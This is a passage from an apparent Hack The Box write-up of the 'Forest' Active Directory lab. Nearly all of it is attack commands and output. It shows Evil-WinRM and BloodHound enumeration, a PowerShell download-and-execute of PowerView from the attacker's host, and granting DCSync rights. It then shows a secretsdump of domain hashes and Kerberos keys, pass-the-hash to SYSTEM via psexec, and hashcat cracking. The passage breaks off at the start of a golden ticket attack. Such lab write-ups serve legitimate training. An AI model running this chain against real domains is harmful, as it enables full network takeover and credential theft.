+    Connection-specific DNS Suffix  . :
+ *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
+ htb\svc-alfresco
+ *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> </figure></pre>
+ <p>In Kali Linux, download the <code>privilege-escalation-awesome-scripts-suite</code> from github and then, locate the <code>winPEAS.exe</code>  .
+ <img src="/images/hackthebox/exploit/forest/7.png" alt=""></p>
+ <p>Copy in the current directory.
+ <pre><figure class="highlight plain">cp winPEAS.exe ~/HackTheBox/forest/</figure></pre>
+ <p>In the server connection, create a user and password credential for map a network drive.
+  <pre><figure class="highlight plain"> *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 'Contrasenia' -AsPlainText -Force
+ *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass
+ System.Security.SecureString
+ *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = New-Object System.Management.Automation.PSCredential('diego', $pass)
+ *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred
+ 
+ UserName                     Password
+ --------                     --------
+ diego    System.Security.SecureString</figure></pre>
+ 
+ <p>With the impacket, run a smbserver <code>imapcket-smbserver Sfire $(pwd) -smb2support -user diego -password Contrasenia</code> with credentials diego/Contrasenia
+ <img src="/images/hackthebox/exploit/forest/8.png" alt=""></p>
+ <p>Connect from the AD server to network drive.
+<pre><figure class="highlight plain"> *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> New-PSDrive -Name diego -PSProvider FileSystem -Credential $cred -Root \\10.10.14.45\Sfire
+ 
+ Name           Used (GB)     Free (GB) Provider      Root                                                                                                                                                                                 CurrentLocation
+ ----           ---------     --------- --------      ----                                                                                                                                                                                 ---------------
+ diego                                  FileSystem    \\10.10.14.45\Sfire
+ 
+ 
+ *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> </figure></pre>
+ <p>Listing the current directory map network.
+ <img src="/images/hackthebox/exploit/forest/9.png" alt=""></p>
+ <p>Run <code>winPEAS.exe</code> for enumerate some vulnerability into the windows server, but was not found some util information.
+  <img src="/images/hackthebox/exploit/forest/10.png" alt=""></p>
+  <p>Not util data important found.
+   <img src="/images/hackthebox/exploit/forest/11.png" alt=""></p>
+  <p>Now, for deep enumeration of Active Directory we will need data output from server.<br>
+  <p> The first way is launching <code>SharpHound.exe </code> to generate files for read with <code>bloodhound</code> tool, the output will a file with the exetension .zip from active directory.
+ <pre><figure class="highlight plain"> Evil-WinRM* PS diego:\> .\SharpHound.exe -c all
+-----------------------------------------------
+Initializing SharpHound at 4:17 PM on 6/24/2020
+-----------------------------------------------
+
+Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
+
+[+] Creating Schema map for domain HTB.LOCAL using path CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL
+[+] Cache File not Found: 0 Objects in cache
+
+[+] Pre-populating Domain Controller SIDS
+Status: 0 objects finished (+0) -- Using 21 MB RAM
+Status: 123 objects finished (+123 8.785714)/s -- Using 28 MB RAM
+Enumeration finished in 00:00:14.9719301
+Compressing data to .\20200624161714_BloodHound.zip
+You can upload this file directly to the UI
+
+
+SharpHound Enumeration Completed at 4:18 PM on 6/24/2020! Happy Graphing!</figure></pre>
+<p>The second way is from kali linux, with credentials users.
+ <pre><figure class="highlight plain">  |-------(root@kali)-------|(~/HackTheBox/forest/AD)
+ |                                                                                                                                                                          
+ |-->{SFire129}#bloodhound-python -d htb.local -usvc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161
+ INFO: Found AD domain: htb.local
+ INFO: Connecting to LDAP server: FOREST.htb.local
+ INFO: Found 1 domains
+ INFO: Found 1 domains in the forest
+ INFO: Found 2 computers
+ INFO: Connecting to LDAP server: FOREST.htb.local
+ WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
+ INFO: Found 32 users
+ INFO: Found 75 groups
+ INFO: Found 0 trusts
+ INFO: Starting computer enumeration with 10 workers
+ INFO: Querying computer: EXCH01.htb.local
+ INFO: Querying computer: FOREST.htb.local
+ INFO: Done in 00M 40S
+ |-------(root@kali)-------|(~/HackTheBox/forest/AD)
+ |                                                                                                                                                                          
+ |-->{SFire129}#ls                                                                                                                                                          
+ computers.json  domains.json  groups.json  users.json</figure></pre>
+  <h2 id="BloodHound"><a href="#BloodHound" class="BloodHound" title="BloodHound"></a>BloodHound</h2>
+  <p>For run the <code>BloodHound</code> will need to run the command <code>neo4j console</code>.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(/opt/BloodHound)
+|                                                                                                                                                                          
+|-->{SFire129}#neo4j console                                                                                                                                               
+Directories in use:
+  home:         /var/lib/neo4j
+  config:       /etc/neo4j
+  logs:         /var/log/neo4j
+  plugins:      /var/lib/neo4j/plugins
+  import:       /var/lib/neo4j/import
+  data:         /var/lib/neo4j/data
+  certificates: /var/lib/neo4j/certificates
+  run:          /var/run/neo4j
+Starting Neo4j.
+WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.
+2020-06-24 22:43:47.930+0000 INFO  Note that since you did not explicitly set the port in dbms.connector.bolt.advertised_address Neo4j automatically set it to 7687 to match dbms.connector.bolt.listen_address. This behavior may change in the future and we recommend you to explicitly set it.
+2020-06-24 22:43:47.961+0000 INFO  ======== Neo4j 4.0.5 ========
+2020-06-24 22:43:47.974+0000 INFO  Starting...
+2020-06-24 22:43:56.605+0000 INFO  Bolt enabled on 0.0.0.0:7687.
+2020-06-24 22:43:56.606+0000 INFO  Started.
+2020-06-24 22:43:59.186+0000 INFO  Remote interface available at http://localhost:7474/
+2020-06-24 23:03:03.544+0000 WARN  The client is unauthorized due to authentication failure.
+2020-06-24 23:03:28.441+0000 WARN  The client is unauthorized due to authentication failure.
+2020-06-24 23:03:33.183+0000 WARN  The client is unauthorized due to authentication failure.</figure></pre>
+<p>From user <code>kali</code> run the command <code>bloodhound</code> and pop-up will show the GUI tool.
+ <img src="/images/hackthebox/exploit/forest/12.png" alt=""></p>
+<p>Search the user <code>svc-alfresco</code> and mark as Owned.
+ <img src="/images/hackthebox/exploit/forest/13.png" alt=""></p>
+ <p>Clic in queries tab, and search the path to become the user, in this case the groups owner is EXCHANGE WINDOWS PERMISION.
+ <img src="/images/hackthebox/exploit/forest/14.png" alt=""></p>
+<p>Create an user and add to domain in the AD server conection.
+ <img src="/images/hackthebox/exploit/forest/15.png" alt=""></p>
+<p>List the AD groups and locate the EXCHANGE WINDOWS PERMISSION.
+ <img src="/images/hackthebox/exploit/forest/16.png" alt=""></p>
+ <p>Add user created to group EXCHANGE WINDOWS PERMISSION
+ <pre><figure class="highlight plain">*Evil-WinRM* PS diego:\> net group "Exchange Windows Permissions" /add diego
+The command completed successfully.</figure></pre>
+<p>In this point will need to run commands powershell, we need a script <code>PowerView.ps1 from PowerShellMafia Github</code> clone the repository and locate the <code>PowerView.ps1</code>, copy and paste in current directory, then, run http server.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(/opt/PowerSploit)
+ |                                                                                                                                                                          
+ |-->{SFire129}#cd Recon/                                                                                                                                                   
+ |-------(root@kali)-------|(/opt/PowerSploit/Recon)
+ |                                                                                                                                                                          
+ |-->{SFire129}#ls                                                                                                                                                          
+ Dictionaries            Get-HttpStatus.ps1                    Invoke-Portscan.ps1          PowerView.ps1  Recon.psd1
+ Get-ComputerDetail.ps1  Invoke-CompareAttributesForClass.ps1  Invoke-ReverseDnsLookup.ps1  README.md      Recon.psm1
+ |-------(root@kali)-------|(/opt/PowerSploit/Recon)
+ |                                                                                                                                                                          
+ |-->{SFire129}#cp PowerView.ps1 ~/HackTheBox/forest/www
+ |-------(root@kali)-------|(/opt/PowerSploit/Recon)
+ |                                                                                                                                                                          
+ |-->{SFire129}#cd ~/HackTheBox/forest/www                                                                                                                                  
+ |-------(root@kali)-------|(~/HackTheBox/forest/www)
+ |                                                                                                                                                                          
+ |-->{SFire129}#python3 -m http.server 80                                                                                                                                   
+ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</figure></pre>
+ <p>In the second connection <code>evil-winrm.rb </code> create again $pass and $cred, download the file <code>Powerview.ps1</code> from kali linux, and add the user to Identity Principal and ACL.
+  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/forest)
+ |                                                                                                                                                                          
+ |-->{SFire129}#ruby evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice                                                                                               
+ 
+ Evil-WinRM shell v2.3
+ 
+ Info: Establishing connection to remote endpoint
+ 
+ *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 'Contrasenia' -AsPlainText -Force
+ *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = New-Object System.Management.Automation.PSCredential('htb\diego', $pass)
+ *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.45/PowerView.ps1')
+ *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-ObjectACL -PrincipalIdentity diego -Credential $cred -Rights DCSync
+ *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> </figure></pre>
+ <h2 id="DumpHashes"><a href="#DumpHashes" class="DumpHashes" title="DumpHashes"></a>DumpHashes</h2>
+  <p>Once launched the PowerView.ps1, run the <code>secretsdump.py</code> for dump hashes with the user created.
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/forest)
+ |                                                                                                                                                                                                                                          
+ |-->{SFire129}#./secretsdump.py htb/diego@10.10.10.161                                                                                                                                                                   
+ Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation
+ 
+ Password:
+ [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+ [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+ [*] Using the DRSUAPI method to get NTDS.DIT secrets
+ [-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
+ [*] Something wen't wrong with the DRSUAPI approach. Try again with -use-vss parameter
+ [*] Cleaning up... 
+ |-------(root@kali)-------|(~/HackTheBox/forest)
+ |                                                                                                                                                                                                                                          
+ |-->{SFire129}#./secretsdump.py htb/diego@10.10.10.161                                                                                                                                                                                     
+ Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation
+ 
+ Password:
+ [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+ [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+ [*] Using the DRSUAPI method to get NTDS.DIT secrets
+ htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
+ htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
+ htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
+ htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
+ htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
+ htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
+ htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
+ htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
+ htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
+ htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
+ htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
+ htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
+ htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
+ htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
+ htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
+ htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
+ htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
+ diego:7602:aad3b435b51404eeaad3b435b51404ee:74814a1e22f75ef64e06e0595b2d4283:::
+ FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:ce5ffb01ff51777654d3d8a687ab0315:::
+ EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
+ [*] Kerberos keys grabbed
+ krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
+ krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
+ krbtgt:des-cbc-md5:9dd5647a31518ca8
+ htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
+ htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
+ htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
+ htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
+ htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
+ htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
+ htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
+ htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
+ htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
+ htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
+ htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
+ htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
+ htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
+ htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
+ htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
+ htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
+ htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
+ htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
+ htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
+ htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
+ htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
+ htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
+ htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
+ htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
+ htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
+ htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
+ htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
+ htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
+ htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
+ htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
+ htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
+ htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
+ htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
+ htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
+ htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
+ htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
+ htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
+ htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
+ htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
+ htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
+ htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
+ htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
+ htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
+ htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
+ htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
+ htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
+ htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
+ htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
+ htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
+ htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
+ htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
+ diego:aes256-cts-hmac-sha1-96:36bde14d0dba18752d4bc492500153ccfcdb987ba07bc63a44285bea6f2d68f2
+ diego:aes128-cts-hmac-sha1-96:a100e74db3533c269f8f19888f56e1b7
+ diego:des-cbc-md5:ef739e31d9a8619e
+ FOREST$:aes256-cts-hmac-sha1-96:611cad8d783a590350e350086ac0080009b0b6a7f38f10f812d485053c92db21
+ FOREST$:aes128-cts-hmac-sha1-96:a04573f03350f5a95d8b487d6745cba6
+ FOREST$:des-cbc-md5:4a9e98c46da29858
+ EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
+ EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
+ EXCH01$:des-cbc-md5:8c45f44c16975129</figure></pre>
+  <p>Copy the hash administrator and with <code>psexec.py</code>, connect to server.
+ <pre><figure class="highlight plain">  |-------(root@kali)-------|(~/HackTheBox/forest)
+ |                                                                                                                                                                          
+ |-->{SFire129}#psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161                                              
+ Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation
+ 
+ [*] Requesting shares on 10.10.10.161.....
+ [*] Found writable share ADMIN$
+ [*] Uploading file HWgvrMXG.exe
+ [*] Opening SVCManager on 10.10.10.161.....
+ [*] Creating service wcEg on 10.10.10.161.....
+ [*] Starting service wcEg.....
+ [!] Press help for extra shell commands
+ Microsoft Windows [Version 10.0.14393]
+ (c) 2016 Microsoft Corporation. All rights reserved.
+ 
+ C:\Windows\system32>whoami
+ nt authority\system
+ 
+ C:\Windows\system32></figure></pre>
+ 
+ <p>With hashcat is possible to crack the hashes.
+ <pre><figure class="highlight plain"> D:\hashcat-6.0.0>type ntlm.forest.txt
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
+htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
+htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
+htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
+htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
+htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
+htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
+htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
+htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
+htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
+htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
+htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
+htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
+htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
+htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
+htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
+htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
+diego:7602:aad3b435b51404eeaad3b435b51404ee:74814a1e22f75ef64e06e0595b2d4283:::
+ D:\hashcat-6.0.0>hashcat.exe --user -m 1000 ntlm.forest.txt rockyou.txt -r d:\hashcat-6.0.0\rules\InsidePro-PasswordsPro.rule -O</figure></pre>
+ <p>With options <code>--show</code> is possible to view the password.
+ <pre><figure class="highlight plain"> D:\hashcat-6.0.0>hashcat.exe --user -m 1000 ntlm.forest.txt rockyou.txt --show
+ Guest:31d6cfe0d16ae931b73c59d7e0c089c0:
+ htb.local\SM_681f53d4942840e18:31d6cfe0d16ae931b73c59d7e0c089c0:
+ DefaultAccount:31d6cfe0d16ae931b73c59d7e0c089c0:
+ htb.local\$331000-VK4ADACQNUCA:31d6cfe0d16ae931b73c59d7e0c089c0:
+ htb.local\SM_2c8eef0a09b545acb:31d6cfe0d16ae931b73c59d7e0c089c0:
+ htb.local\SM_ca8c2ed5bdab4dc9b:31d6cfe0d16ae931b73c59d7e0c089c0:
+ htb.local\SM_75a538d3025e4db9a:31d6cfe0d16ae931b73c59d7e0c089c0:
+ htb.local\SM_1b41c9286325456bb:31d6cfe0d16ae931b73c59d7e0c089c0:
+ htb.local\SM_9b69f1b9d2cc45549:31d6cfe0d16ae931b73c59d7e0c089c0:
+ htb.local\SM_7c96b981967141ebb:31d6cfe0d16ae931b73c59d7e0c089c0:
+ htb.local\SM_c75ee099d0a64c91b:31d6cfe0d16ae931b73c59d7e0c089c0:
+ htb.local\SM_1ffab36a2f5f479cb:31d6cfe0d16ae931b73c59d7e0c089c0:
+ htb.local\svc-alfresco:9248997e4ef68ca2bb47ae4e6f128668:s3rvice
+ htb.local\santi:483d4c70248510d8e0acb6066cd89072:plokmijnuhb
+ diego:74814a1e22f75ef64e06e0595b2d4283:Contrasenia</figure></pre>
+ <h2 id="GoldenTicket"><a href="#GoldenTicket" class="GoldenTicket" title="GoldenTicket"></a>GoldenTicket</h2>
+ <p>For run the golden ticket attack, need the SID domain
+ <img src="/images/hackthebox/exploit/forest/19.png" alt=""></p>
+ <p>Configure the file </code>host</code> for htb.local, htb and forest for response to IP server.
+ <pre><figure class="highlight plain"> |-->{SFire129}#vi /etc/hosts
+|-------(root@kali)-------|(~/HackTheBox/forest)
+|
+|-->{SFire129}#ping htb.local
+PING htb.local (10.10.10.161) 56(84) bytes of data.
+64 bytes from htb.local (10.10.10.161): icmp_seq=1 ttl=127 time=103 ms
+^C
+--- htb.local ping statistics ---
